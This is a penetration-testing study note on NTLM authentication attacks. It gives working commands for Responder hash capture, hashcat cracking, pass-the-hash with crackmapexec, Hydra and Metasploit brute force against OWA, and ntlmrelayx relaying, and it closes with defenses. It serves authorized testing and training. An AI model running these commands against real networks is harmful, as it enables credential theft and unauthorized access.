---
tags: [vapt, authentication, network, intermediate]
difficulty: intermediate
module: "16 - Authentication"
topic: "16.19 NTLM Authentication Attacks"
---

# 16.19 — NTLM Authentication Attacks

## What Is NTLM?

```
NTLM (NT LAN Manager):
  Microsoft's challenge-response authentication protocol
  Used in: Windows networks, IIS web servers, Exchange, SMB
  
NTLM FLOW (NTLM Handshake):
  1. Client → Server: NEGOTIATE (I want to authenticate)
  2. Server → Client: CHALLENGE (here's a random 8-byte nonce)
  3. Client → Server: AUTHENTICATE (NT hash = HMAC-MD5(NT_HASH, challenge))
  
NTLM HASHES:
  LM hash:  Legacy, very weak (DES-based, uppercase, split in 7-char chunks)
  NT hash:  MD4 of UTF-16-LE encoded password
  NTLMv1:  Server challenge only
  NTLMv2:  Server challenge + client challenge + timestamp (more secure)
```

---

## NTLM on Web Applications

```
NTLM HTTP AUTH:
  Some IIS/Exchange applications use NTLM over HTTP!
  
  Server response:
  HTTP/1.1 401 Unauthorized
  WWW-Authenticate: NTLM
  
  Client: Authorization: NTLM TlRMTVNTUAABAAAA... (base64 NEGOTIATE blob)
  Server: Authorization: NTLM TlRMTVNTUAACAAAA... (base64 CHALLENGE blob)
  Client: Authorization: NTLM TlRMTVNTUAADAAAA... (base64 AUTHENTICATE blob)
  
EXTRACT NTLM HASH FROM WEB APP:
  The authenticate blob contains NTLMv2 hash!
  Can be cracked offline with Hashcat
  
BURP:
  Intercept → Base64 decode NTLM blobs → extract hash
  Or: Responder can capture NTLM hashes from HTTP!
```

---

## Capturing NTLM Hashes

```bash
# TOOL: RESPONDER (captures NTLM hashes from network)
# ONLY USE ON AUTHORIZED NETWORKS!
sudo responder -I eth0 -wrf
# -w = start WPAD (proxy) server
# -r = enable answers for netbios NBTNS
# -f = fingerprint hosts

# HOW IT WORKS:
# Responder listens for NBNS/LLMNR/mDNS broadcasts
# When Windows can't find a host → broadcasts "Where is fileserver?"
# Responder responds "I am fileserver!"
# Windows authenticates with NTLM → Responder captures hash!

# CAPTURED HASH FORMAT:
# username::domain:challenge:NTProofStr:rest_of_blob

# CRACK WITH HASHCAT:
hashcat -m 5600 captured_hashes.txt /usr/share/wordlists/rockyou.txt
# -m 5600 = NetNTLMv2

# CRACK NTLMv1:
hashcat -m 5500 captured_hashes.txt rockyou.txt --force

# PASS THE HASH (no cracking needed!):
# If you have the NT hash (from SAM dump, LSASS, etc.)
# Authenticate directly with hash instead of password:
crackmapexec smb target.com -u admin -H "NT_HASH_HEX"
# This is a network/AD technique — see Module: Active Directory
```

---

## Web NTLM Brute Force

```bash
# BRUTE FORCE NTLM WEB AUTH WITH HYDRA:
hydra -l DOMAIN\\administrator -P passwords.txt \
  target.com http-get /owa \
  -t 4 -w 5

# NOTE: Domain\username format for NTLM!
# Use single backslash in domain\user or encode as needed

# BURP INTRUDER:
# Burp handles NTLM handshake automatically for brute force
# 1. Find NTLM-protected URL (401 WWW-Authenticate: NTLM)
# 2. Send to Intruder
# 3. Set credentials in Intruder options
# 4. Burp auto-handles the 3-step NTLM handshake per attempt

# METASPLOIT — IIS NTLM:
use auxiliary/scanner/http/owa_login
set RHOSTS target.com
set USERNAME administrator
set PASS_FILE passwords.txt
run
```

---

## NTLM Relay Attack

```
CONCEPT:
  Don't crack the hash — RELAY IT!
  
  1. Attacker captures NTLM authentication from victim's machine
     (Via Responder, malicious UNC path, etc.)
  2. Simultaneously forward (relay) to a different server
  3. Server authenticates the attacker as the victim!
  
TOOL: ntlmrelayx.py (impacket):
  sudo python3 ntlmrelayx.py -tf targets.txt -smb2support
  (Relay to SMB shares, extract SAM database, etc.)
  
COMBINED WITH RESPONDER:
  Responder captures → ntlmrelayx forwards → attacker gets access!
  
NOTE: Only in scope for internal network assessments!
```

---

## Fix

```
DEFENSES AGAINST NTLM ATTACKS:
  ✓ Disable NTLMv1 (only allow NTLMv2 minimum)
  ✓ Require SMB signing (prevents relay attacks)
  ✓ Disable LLMNR and NBNS (prevents Responder capture)
    GPO: Computer Config → Administrative Templates → DNS Client → Turn off multicast name resolution
  ✓ Use Kerberos instead of NTLM where possible (Active Directory)
  ✓ For web apps: replace NTLM with Forms auth + OAuth
  ✓ Use Extended Protection for Authentication (EPA/channel binding)
  ✓ Strong passwords → cracking slower
  ✓ MFA → cracked/relayed hash alone not enough
```

---

## Related Notes
- [[17 - Basic Auth Cracking]] — HTTP auth comparison
- [[18 - HTTP Digest Auth Attacks]] — similar challenge-response
- [[Module: Active Directory]] — NTLM in AD environments
